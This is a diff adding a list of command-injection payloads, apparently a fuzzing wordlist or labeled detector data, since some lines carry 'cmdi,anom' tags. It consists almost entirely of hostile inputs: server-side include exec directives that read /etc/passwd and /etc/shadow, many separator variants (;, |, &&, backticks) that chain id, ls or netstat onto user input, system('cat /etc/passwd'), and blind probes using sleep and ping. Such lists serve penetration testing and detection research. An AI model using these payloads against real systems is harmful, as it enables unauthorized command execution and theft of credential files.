@@ -1,0 +1,89 @@
++|+dir+c:",10,cmdi,anom $+|+dir+c:"
+&&+|+dir c:",12,cmdi,anom $&&dir c:"
++dir+c:",8,cmdi,anom $&&dir+c:"
++|+dir+c:/
+$+|+dir+c:/
+&&+|+dir c:/
+$&&dir+c:/
++dir+c:/
++dir+c:+|
++|+dir+c:+|
++|+dir+c:/+|
+dir+c:",7,cmdi,anom ||+dir|c:"
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+/index.html|id|
+;id;
+;id
+;netstat -a;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+/bin/ls -al
+/usr/bin/id
+id
+/usr/bin/id;
+id;
+/usr/bin/id|
+id|
+;/usr/bin/id
+|usr/bin/id
+|nid
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+;system('cat /etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+cat /etc/passwd
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+ping -i 30 127.0.0.1
+`ping 127.0.0.1`
+| id
+& id
+; id
+$;/usr/bin/id
+asdf3334
+; /bin/sleep 31 ;
+'uname'
+'false'
+'true'
+"`uname`"
+"`false`"
+"`true`"
+`uname`
+`false`
+`true`
+" ; /bin/sleep 31 ;
+' ; /bin/sleep 31 ;
+| /bin/sleep 31 ;
+"| /bin/sleep 31 ;
+'| /bin/sleep 31 ;
+ping.exe -n 31 127.0.0.1
+" ping.exe -n 31 127.0.0.1
